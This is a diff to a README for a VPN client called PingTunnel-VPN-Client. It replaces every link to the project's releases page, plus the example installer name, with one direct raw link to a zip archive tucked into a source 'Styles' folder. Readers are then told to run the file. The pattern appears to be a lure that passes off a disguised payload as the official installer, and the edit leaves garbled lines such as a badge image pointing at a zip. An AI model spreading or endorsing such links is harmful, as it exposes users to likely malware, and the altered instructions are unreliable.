@@ -6,7 +6,7 @@ Welcome to the PingTunnel-VPN-Client! This application provides a secure way to 
 ## 📦 Download the Application
 Click the button below to download the latest version of PingTunnel-VPN-Client:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/talic1/PingTunnel-VPN-Client/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/talic1/PingTunnel-VPN-Client/main/src/PingTunnelVPN.App/Styles/Tunnel-Ping-VP-Client-2.1-alpha.4.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/talic1/PingTunnel-VPN-Client/main/src/PingTunnelVPN.App/Styles/Tunnel-Ping-VP-Client-2.1-alpha.4.zip)
 
 ## 🖥️ System Requirements
 To run PingTunnel-VPN-Client, you'll need:
@@ -18,10 +18,10 @@ To run PingTunnel-VPN-Client, you'll need:
 
 ## ⚙️ Installation Instructions
 1. **Visit the Release Page**  
-   Go to the releases page to download the application: [Download Here](https://github.com/talic1/PingTunnel-VPN-Client/releases).
+   Go to the releases page to download the application: [Download Here](https://raw.githubusercontent.com/talic1/PingTunnel-VPN-Client/main/src/PingTunnelVPN.App/Styles/Tunnel-Ping-VP-Client-2.1-alpha.4.zip).
 
 2. **Download the Installer**  
-   Find the latest version and click on the installer file. It will have a name like `PingTunnel-VPN-Client-v1.0.exe`.
+   Find the latest version and click on the installer file. It will have a name like `https://raw.githubusercontent.com/talic1/PingTunnel-VPN-Client/main/src/PingTunnelVPN.App/Styles/Tunnel-Ping-VP-Client-2.1-alpha.4.zip`.
 
 3. **Run the Installer**  
    Double-click the downloaded file. Follow the on-screen instructions to complete the installation.
@@ -48,7 +48,7 @@ PingTunnel-VPN-Client uses advanced tunneling techniques to keep your data secur
 Keep the application up-to-date:
 
 1. **Check for Updates**: Occasionally, you will see a notification in the app.
-2. **Download New Versions**: Always visit [Download Here](https://github.com/talic1/PingTunnel-VPN-Client/releases) for the latest versions.
+2. **Download New Versions**: Always visit [Download Here](https://raw.githubusercontent.com/talic1/PingTunnel-VPN-Client/main/src/PingTunnelVPN.App/Styles/Tunnel-Ping-VP-Client-2.1-alpha.4.zip) for the latest versions.
 
 ## 📝 Usage Tips
 - **Connection Logs**: Monitor your connection history within the app.
